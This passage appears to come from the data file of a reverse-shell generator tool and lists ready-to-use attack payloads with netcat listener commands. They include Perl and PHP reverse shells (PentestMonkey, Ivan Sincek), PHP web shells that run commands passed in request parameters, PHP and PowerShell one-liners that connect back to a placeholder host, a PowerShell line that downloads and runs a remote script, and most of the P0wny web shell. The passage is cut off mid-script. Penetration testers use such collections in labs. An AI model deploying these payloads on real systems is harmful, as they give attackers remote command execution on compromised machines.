	cgiprint("Couldn't open reverse shell to $ip:$port: $!");
	cgiexit();	
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"{shell}"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
	my $line = shift;
	$line .= "<p>\\n";
	$global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
	cgiprintpage();
	exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
	print "Content-Length: " . length($global_page) . "\\r
Connection: close\\r
Content-Type: text\\/html\\r\\n\\r\\n" . $global_page;
}
`,listener:"nc -lvnp {port}",notes:"Classic PentestMonkey standalone reverse shell. Widely used across HTB & OSCP for file uploads.",extension:".pl",isFullScript:!0},{id:"rev-php-pentestmonkey",name:"PHP PentestMonkey",category:"Reverse",language:"PHP",platform:"Both",command:`<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '{ip}';
$port = {port};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; {shell} -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\\n";
	}
}

?>`,listener:"nc -lvnp {port}",notes:"Classic PentestMonkey standalone reverse shell. Widely used across HTB & OSCP for file uploads.",extension:".php",isFullScript:!0},{id:"rev-php-ivan-sincek",name:"PHP Ivan Sincek",category:"Reverse",language:"Netcat",platform:"Both",command:`<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = '{shell}';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from \${name}, script will now exit...\\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to \${name}, script will now exit...\\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('{ip}', {port});
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>`,listener:"nc -lvnp {port}",notes:"Ivan Sincek high-compatibility multi-OS (Linux/Windows/macOS) non-blocking reverse shell.",extension:".php",isFullScript:!0},{id:"rev-php-cmd",name:"PHP cmd",category:"Reverse",language:"PHP",platform:"Both",command:`<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();<\/script>
</html>`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!0},{id:"rev-php-cmd-2",name:"PHP cmd 2",category:"Reverse",language:"PHP",platform:"Both",command:'<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-cmd-small",name:"PHP cmd small",category:"Reverse",language:"PHP",platform:"Both",command:"<?=`$_GET[0]`?>",listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-exec",name:"PHP exec",category:"Reverse",language:"PHP",platform:"Linux",command:`php -r '$sock=fsockopen("{ip}",{port});exec("{shell} <&3 >&3 2>&3");'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-shell-exec",name:"PHP shell_exec",category:"Reverse",language:"PHP",platform:"Linux",command:`php -r '$sock=fsockopen("{ip}",{port});shell_exec("{shell} <&3 >&3 2>&3");'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-system",name:"PHP system",category:"Reverse",language:"PHP",platform:"Both",command:`php -r '$sock=fsockopen("{ip}",{port});system("{shell} <&3 >&3 2>&3");'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-passthru",name:"PHP passthru",category:"Reverse",language:"PHP",platform:"Linux",command:`php -r '$sock=fsockopen("{ip}",{port});passthru("{shell} <&3 >&3 2>&3");'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php",name:"PHP `",category:"Reverse",language:"PHP",platform:"Both",command:"php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-popen",name:"PHP popen",category:"Reverse",language:"PHP",platform:"Both",command:`php -r '$sock=fsockopen("{ip}",{port});popen("{shell} <&3 >&3 2>&3", "r");'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-php-proc-open",name:"PHP proc_open",category:"Reverse",language:"PHP",platform:"Both",command:`php -r '$s=fsockopen("{ip}",{port});proc_open("{shell}",[$s,$s,$s],$p);'`,listener:"nc -lvnp {port}",notes:"",extension:".php",isFullScript:!1},{id:"rev-windows-conpty",name:"Windows ConPty",category:"Reverse",language:"PowerShell",platform:"Windows",command:"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",listener:"stty raw -echo; (stty size; cat) | nc -lvnp {port}",notes:"Spawns full interactive Windows console with ConPty terminal emulation.",extension:".txt",isFullScript:!1},{id:"rev-powershell-1",name:"PowerShell #1",category:"Reverse",language:"PowerShell",platform:"Both",command:'$LHOST = "{ip}"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()',listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-powershell-2",name:"PowerShell #2",category:"Reverse",language:"PowerShell",platform:"Both",command:`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-powershell-3",name:"PowerShell #3",category:"Reverse",language:"PowerShell",platform:"Both",command:`powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"`,listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-powershell-4-tls",name:"PowerShell #4 (TLS)",category:"Reverse",language:"PowerShell",platform:"Both",command:"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-powershell-3-base64",name:"PowerShell #3 (Base64)",category:"Reverse",language:"PowerShell",platform:"Both",command:"PowerShell #3 (Base64)",listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-powershell-5-stderr-support-base64",name:"PowerShell #5 (stderr support) (Base64)",category:"Reverse",language:"PowerShell",platform:"Both",command:"PowerShell #5 (stderr support) (Base64)",listener:"nc -lvnp {port}",notes:"",extension:".ps1",isFullScript:!1},{id:"rev-p0wny-shell-webshell",name:"P0wny Shell (Webshell)",category:"Reverse",language:"PowerShell",platform:"Both",command:`<?php\r
\r
$SHELL_CONFIG = array(\r
    'username' => 'p0wny',\r
    'hostname' => 'shell',\r
);\r
\r
function expandPath($path) {\r
    if (preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)) {\r
        exec("echo $match[1]", $stdout);\r
        return $stdout[0] . $match[2];\r
    }\r
    return $path;\r
}\r
\r
function allFunctionExist($list = array()) {\r
    foreach ($list as $entry) {\r
        if (!function_exists($entry)) {\r
            return false;\r
        }\r
    }\r
    return true;\r
}\r
\r
function executeCommand($cmd) {\r
    $output = '';\r
    if (function_exists('exec')) {\r
        exec($cmd, $output);\r
        $output = implode("\\n", $output);\r
    } else if (function_exists('shell_exec')) {\r
        $output = shell_exec($cmd);\r
    } else if (allFunctionExist(array('system', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\r
        ob_start();\r
        system($cmd);\r
        $output = ob_get_contents();\r
        ob_end_clean();\r
    } else if (allFunctionExist(array('passthru', 'ob_start', 'ob_get_contents', 'ob_end_clean'))) {\r
        ob_start();\r
        passthru($cmd);\r
        $output = ob_get_contents();\r
        ob_end_clean();\r
    } else if (allFunctionExist(array('popen', 'feof', 'fread', 'pclose'))) {\r
        $handle = popen($cmd, 'r');\r
        while (!feof($handle)) {\r
            $output .= fread($handle, 4096);\r
        }\r
        pclose($handle);\r
    } else if (allFunctionExist(array('proc_open', 'stream_get_contents', 'proc_close'))) {\r
        $handle = proc_open($cmd, array(0 => array('pipe', 'r'), 1 => array('pipe', 'w')), $pipes);\r
        $output = stream_get_contents($pipes[1]);\r
        proc_close($handle);\r
    }\r
    return $output;\r
}\r
\r
function isRunningWindows() {\r
    return stripos(PHP_OS, "WIN") === 0;\r
}\r
\r
function featureShell($cmd, $cwd) {\r
    $stdout = "";\r
\r
    if (preg_match("/^\\s*cd\\s*(2>&1)?$/", $cmd)) {\r
        chdir(expandPath("~"));\r
    } elseif (preg_match("/^\\s*cd\\s+(.+)\\s*(2>&1)?$/", $cmd)) {\r
        chdir($cwd);\r
        preg_match("/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/", $cmd, $match);\r
        chdir(expandPath($match[1]));\r
    } elseif (preg_match("/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/", $cmd)) {\r
        chdir($cwd);\r
        preg_match("/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/", $cmd, $match);\r
        return featureDownload($match[1]);\r
    } else {\r
        chdir($cwd);\r
        $stdout = executeCommand($cmd);\r
    }\r
\r
    return array(\r
        "stdout" => base64_encode($stdout),\r
        "cwd" => base64_encode(getcwd())\r
    );\r
}\r
\r
function featurePwd() {\r
    return array("cwd" => base64_encode(getcwd()));\r
}\r
\r
function featureHint($fileName, $cwd, $type) {\r
    chdir($cwd);\r
    if ($type == 'cmd') {\r
        $cmd = "compgen -c $fileName";\r
    } else {\r
        $cmd = "compgen -f $fileName";\r
    }\r
    $cmd = "/bin/bash -c \\"$cmd\\"";\r
    $files = explode("\\n", shell_exec($cmd));\r
    foreach ($files as &$filename) {\r
        $filename = base64_encode($filename);\r
    }\r
    return array(\r
        'files' => $files,\r
    );\r
}\r
\r
function featureDownload($filePath) {\r
    $file = @file_get_contents($filePath);\r
    if ($file === FALSE) {\r
        return array(\r
            'stdout' => base64_encode('File not found / no read permission.'),\r
            'cwd' => base64_encode(getcwd())\r
        );\r
    } else {\r
        return array(\r
            'name' => base64_encode(basename($filePath)),\r
            'file' => base64_encode($file)\r
        );\r
    }\r
}\r
\r
function featureUpload($path, $file, $cwd) {\r
    chdir($cwd);\r
    $f = @fopen($path, 'wb');\r
    if ($f === FALSE) {\r
        return array(\r
            'stdout' => base64_encode('Invalid path / no write permission.'),\r
            'cwd' => base64_encode(getcwd())\r
        );\r
    } else {\r
        fwrite($f, base64_decode($file));\r
        fclose($f);\r
        return array(\r
            'stdout' => base64_encode('Done.'),\r
            'cwd' => base64_encode(getcwd())\r
        );\r
    }\r
}\r
\r
function initShellConfig() {\r
    global $SHELL_CONFIG;\r
\r
    if (isRunningWindows()) {\r
        $username = getenv('USERNAME');\r
        if ($username !== false) {\r
            $SHELL_CONFIG['username'] = $username;\r
        }\r
    } else {\r
        $pwuid = posix_getpwuid(posix_geteuid());\r
        if ($pwuid !== false) {\r
            $SHELL_CONFIG['username'] = $pwuid['name'];\r
        }\r
    }\r
\r
    $hostname = gethostname();\r
    if ($hostname !== false) {\r
        $SHELL_CONFIG['hostname'] = $hostname;\r
    }\r
}\r
\r
if (isset($_GET["feature"])) {\r
\r
    $response = NULL;\r
\r
    switch ($_GET["feature"]) {\r
        case "shell":\r
            $cmd = $_POST['cmd'];\r
            if (!preg_match('/2>/', $cmd)) {\r
                $cmd .= ' 2>&1';\r
            }\r
            $response = featureShell($cmd, $_POST["cwd"]);\r
            break;\r
        case "pwd":\r
            $response = featurePwd();\r
            break;\r
        case "hint":\r
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\r
            break;\r
        case 'upload':\r
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\r
    }\r
\r
    header("Content-Type: application/json");\r
    echo json_encode($response);\r
    die();\r
} else {\r
    initShellConfig();\r
}\r
\r
?><!DOCTYPE html>\r
\r
<html>\r
\r
    <head>\r
        <meta charset="UTF-8" />\r
        <title>p0wny@shell:~#</title>\r
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />\r
        <style>\r
            html, body {\r
                margin: 0;\r
                padding: 0;\r
                background: #333;\r
                color: #eee;\r
                font-family: monospace;\r
                width: 100vw;\r
                height: 100vh;\r
                overflow: hidden;\r
            }\r
\r
            *::-webkit-scrollbar-track {\r
                border-radius: 8px;\r
                background-color: #353535;\r
            }\r
\r
            *::-webkit-scrollbar {\r
                width: 8px;\r
                height: 8px;\r
            }\r
\r
            *::-webkit-scrollbar-thumb {\r
                border-radius: 8px;\r
                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\r
                background-color: #bcbcbc;\r
            }\r
\r
            #shell {\r
                background: #222;\r
                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\r
                font-size: 10pt;\r
                display: flex;\r
                flex-direction: column;\r
                align-items: stretch;\r
                max-width: calc(100vw - 2 * var(--shell-margin));\r
                max-height: calc(100vh - 2 * var(--shell-margin));\r
                resize: both;\r
                overflow: hidden;\r
                width: 100%;\r
                height: 100%;\r
                margin: var(--shell-margin) auto;\r
            }\r
\r
            #shell-content {\r
                overflow: auto;\r
                padding: 5px;\r
                white-space: pre-wrap;\r
                flex-grow: 1;\r
            }\r
\r
            #shell-logo {\r
                font-weight: bold;\r
                color: #FF4180;\r
                text-align: center;\r
            }\r
\r
            :root {\r
                --shell-margin: 25px;\r
            }\r
\r
            @media (min-width: 1200px) {\r
                :root {\r
                    --shell-margin: 50px !important;\r
                }\r
            }\r
\r
            @media (max-width: 991px),\r
                   (max-height: 600px) {\r
                #shell-logo {\r
                    font-size: 6px;\r
                    margin: -25px 0;\r
                }\r
                :root {\r
                    --shell-margin: 0 !important;\r
                }\r
                #shell {\r
                    resize: none;\r
                }\r
            }\r
\r
            @media (max-width: 767px) {\r
                #shell-input {\r
                    flex-direction: column;\r
                }\r
            }\r
\r
            @media (max-width: 320px) {\r
                #shell-logo {\r
                    font-size: 5px;\r
                }\r
            }\r
\r
            .shell-prompt {\r
                font-weight: bold;\r
                color: #75DF0B;\r
            }\r
\r
            .shell-prompt > span {\r
                color: #1BC9E7;\r
            }\r
\r
            #shell-input {\r
                display: flex;\r
                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\r
                border-top: rgba(255, 255, 255, .05) solid 1px;\r
                padding: 10px 0;\r
            }\r
\r
            #shell-input > label {\r
                flex-grow: 0;\r
                display: block;\r
                padding: 0 5px;\r
                height: 30px;\r
                line-height: 30px;\r
            }\r
\r
            #shell-input #shell-cmd {\r
                height: 30px;\r
                line-height: 30px;\r
                border: none;\r
                background: transparent;\r
                color: #eee;\r
                font-family: monospace;\r
                font-size: 10pt;\r
                width: 100%;\r
                align-self: center;\r
                box-sizing: border-box;\r
            }\r
\r
            #shell-input div {\r
                flex-grow: 1;\r
                align-items: stretch;\r
            }\r
\r
            #shell-input input {\r
                outline: none;\r
            }\r
        </style>\r
\r
        <script>\r
            var SHELL_CONFIG = <?php echo json_encode($SHELL_CONFIG); ?>;\r
            var CWD = null;\r
            var commandHistory = [];\r
            var historyPosition = 0;\r
            var eShellCmdInput = null;\r
            var eShellContent = null;\r
\r
            function _insertCommand(command) {\r
                eShellContent.innerHTML += "\\n\\n";\r
                eShellContent.innerHTML += '<span class=\\"shell-prompt\\">' + genPrompt(CWD) + '</span> ';\r
                eShellContent.innerHTML += escapeHtml(command);\r
                eShellContent.innerHTML += "\\n";\r
                eShellContent.scrollTop = eShellContent.scrollHeight;\r
            }\r
\r
            function _insertStdout(stdout) {\r
                eShellContent.innerHTML += escapeHtml(stdout);\r
                eShellContent.scrollTop = eShellContent.scrollHeight;\r
            }\r
\r
            function _defer(callback) {\r
                setTimeout(callback, 0);\r
            }\r
\r
            function featureShell(command) {\r
\r
                _insertCommand(command);\r
                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\r
                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\r
                } else if (/^\\s*clear\\s*$/.test(command)) {\r
                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\r
                    eShellContent.innerHTML = '';\r
                } else {\r
                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {\r
                        if (response.hasOwnProperty('file')) {\r
                            featureDownload(atob(response.name), response.file)\r
                        } else {\r
                            _insertStdout(atob(response.stdout));\r
                            updateCwd(atob(response.cwd));\r
                        }\r
                    });\r
                }\r
            }\r
\r
            function featureHint() {\r
                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\r
\r
                function _requestCallback(data) {\r
                    if (data.files.length <= 1) return;  // no completion\r
                    data.files = data.files.map(function(file){\r
                        return atob(file);\r
                    });\r
                    if (data.files.length === 2) {\r
                        if (type === 'cmd') {\r
                            eShellCmdInput.value = data.files[0];\r
                        } else {\r
                            var currentValue = eShellCmdInput.value;\r
                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\r
                        }\r
                    } else {\r
                        _insertCommand(eShellCmdInput.value);\r
                        _insertStdout(data.files.join("\\n"));\r
                    }\r
                }\r
\r
                var currentCmd = eShellCmdInput.value.split(" ");\r
                var type = (currentCmd.length === 1) ? "cmd" : "file";\r
                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\r
\r
                makeRequest(\r
                    "?feature=hint",\r
                    {\r
                        filename: fileName,\r
                        cwd: CWD,\r
                        type: type\r
                    },\r
                    _requestCallback\r
                );\r
\r
            }\r
\r
            function featureDownload(name, file) {\r
                var element = document.createElement('a');\r
                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\r
                element.setAttribute('download', name);\r
                element.style.display = 'none';\r
                document.body.appendChild(element);\r
                element.click();\r
                document.body.removeChild(element);\r
                _insertStdout('Done.');\r
            }\r
\r
            function featureUpload(path) {\r
                var element = document.createElement('input');\r
                element.setAttribute('type', 'file');\r
                element.style.display = 'none';\r
                document.body.appendChild(element);\r
                element.addEventListener('change', function () {\r
                    var promise = getBase64(element.files[0]);\r
                    promise.then(function (file) {\r
